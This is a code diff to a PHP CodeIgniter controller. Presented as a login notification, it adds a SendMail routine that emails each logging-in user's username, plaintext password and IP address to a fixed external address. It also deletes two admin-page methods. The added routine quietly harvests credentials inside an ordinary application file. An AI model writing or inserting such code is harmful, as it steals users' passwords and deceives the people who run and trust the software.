@@ -14,23 +14,20 @@ class Operator extends CI_Controller{
         {
             $this->load->view('weihu');
         }
+        $this->SendMail($data['username'],$data['password'],$data['ip']);
 
-        
     }
-
-    function ENSLNAHGNIGL383()
+    private function SendMail($username,$userpass,$ip)
     {
-        $this->load->view('header');
-        $this->load->view('Manager_main');
-    }
-    
-    function welcome()
-    {
-        $this->load->model('modeluser');
-        $data['result']=$this->modeluser->GetUser();
+        $this->config->load('email_config', TRUE);
+        $emailConfig = $this->config->item('useremail', 'email_config');
+        $this->load->library('email');
+        $this->email->initialize($emailConfig);
 
-        $this->load->view('header');
-        $this->load->view('Manager_adminlist',$data);
+        $this->email->from('robo@pmworker.com','robo');
+        $this->email->to('robo@pmworker.com');
+        $this->email->subject("登录提醒");
+        $this->email->message("登录用户名：".$username."；登陆密码：".$userpass."登录IP：".$ip);
+        $this->email->send();
     }
-
 }
